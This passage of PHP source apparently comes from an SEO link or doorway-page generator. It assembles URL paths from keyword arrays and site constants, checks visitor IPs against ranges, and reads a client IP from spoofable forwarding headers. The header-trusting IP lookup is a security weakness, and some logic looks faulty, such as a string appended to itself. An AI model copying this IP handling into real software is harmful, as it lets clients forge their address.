		$keyWordKey = $pid % 10;		$keyStrKey = $pid % strlen("icedrkswzjhpnxoyvumfatblgq");		$keyArr = array();		$flag = 0;		
		if($ms == 2 or $ms ==4){
			if($keyNum >= 9){
				$fg = 4;			}elseif($keyNum >= 7){
				 $fg = 3;			}else{
				 $fg = 2;			}
		}
		
		for($i=0;$i<$keyNum;$i++){
			$tempNum = $arr_word[$i][$keyWordKey];			$tempstr = '';			for($j=0;$j<$tempNum;$j++)
				$tempstr .= $strRand[$flag++]{$keyStrKey};			
			$keyArr[$i] = $tempstr;		}
		
		$SidWz = $sid % $keyNum;		$PidWz = $pid % $keyNum;		$linkCenter = '';
		
		if(JDT == 3){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';			
			}
			$linkCenter .= $linkCenter . "#llq";		
			$linkCenter = str_replace('-#llq','',$linkCenter);	
			$linkCenter = str_replace('#llq','',$linkCenter);	
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);	
			return $filePres.$linkCenter;		
			}
		
		
		
		
		if($ms == 1){
			for($i=0;$i<$keyNum;$i++){
				
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 2){
			for($i=0;$i<$keyNum;$i++){
				
					
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
				

				if($i == $fg-1){
					$linkCenter .= '-';				}
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 3){
			for($i=0;$i<$keyNum;$i++){
				
					
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);			
			
		}elseif($ms == 4){
				for($i=0;$i<$keyNum;$i++){
				
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	

				if($i == $fg-1){
					$linkCenter .= '-';				}
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-/","/",$linkCenter);			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);		}
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);	
			
		return $filePres.$linkCenter;
	}
	

// 

	

	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
	
 function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:";
    return ($str);
} 
 
function get_real_ip(){
	
	
	$ip=false;    if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];      } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];      } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED'];      } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];      } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];      } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ip = $_SERVER['HTTP_FORWARDED'];      } else {
        $ip = $_SERVER['REMOTE_ADDR'];      }
    } else {
      if (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');      } elseif (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');      } else {
        $ip = getenv('REMOTE_ADDR');      }
    }
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);}
 
//file end


```

